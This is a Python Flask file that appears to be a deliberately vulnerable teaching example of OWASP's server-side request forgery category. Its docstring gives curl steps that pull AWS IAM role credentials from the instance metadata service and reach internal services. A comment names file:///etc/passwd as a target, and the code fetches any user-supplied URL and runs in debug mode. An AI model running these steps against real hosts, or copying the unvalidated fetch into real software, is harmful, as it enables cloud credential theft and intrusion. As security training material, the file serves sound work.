"""
OWASP A10:2021 - Server-Side Request Forgery (SSRF)

Vulnerability: The application fetches any URL supplied by a user without
validation. When deployed on AWS, an attacker can use this to reach the
Instance Metadata Service (IMDS) and retrieve IAM role credentials,
enabling full AWS account compromise.

Run:
    pip install flask requests
    python app.py

Exploit examples:
    # 1. Reach the AWS Instance Metadata Service (IMDS) to list available metadata
    curl "http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/"

    # 2. Retrieve the IAM role name attached to the instance
    curl "http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

    # 3. Retrieve temporary IAM credentials (AccessKeyId, SecretAccessKey, Token)
    #    Replace <role-name> with the role name returned in step 2
    curl "http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

    # 4. Scan an internal service not exposed to the internet
    curl "http://127.0.0.1:5000/fetch?url=http://10.0.1.100:8080/admin"

Note: The IMDS exploit only works when the vulnerable app is running on an
AWS EC2 instance or ECS task. Running locally will get a connection error.
"""

import requests
from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route("/fetch", methods=["GET"])
def fetch_url():
    url = request.args.get("url", "")

    if not url:
        return jsonify({"error": "url parameter is required"}), 400

    # VULNERABILITY: The application makes an HTTP request to any URL the user provides.
    # There is no validation of the scheme, hostname, or resolved IP address.
    #
    # Attack surface on AWS:
    #   - http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
    #     Returns: { "AccessKeyId": "...", "SecretAccessKey": "...", "Token": "..." }
    #     Impact: Full AWS API access using the instance's IAM role credentials.
    #
    #   - http://10.x.x.x:<port>/  (internal VPC services)
    #     Impact: Access services that are not exposed to the internet.
    #
    #   - file:///etc/passwd  (some HTTP libraries follow file:// URLs)
    #     Impact: Read local files from the application server.
    try:
        # VULNERABLE: Unrestricted outbound HTTP request driven by user input
        response = requests.get(url, timeout=5)
        return jsonify({
            "status_code": response.status_code,
            "body": response.text,           # VULNERABLE: Returns the full response body
        }), 200
    except requests.RequestException as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    # VULNERABILITY: debug=True
    app.run(debug=True)
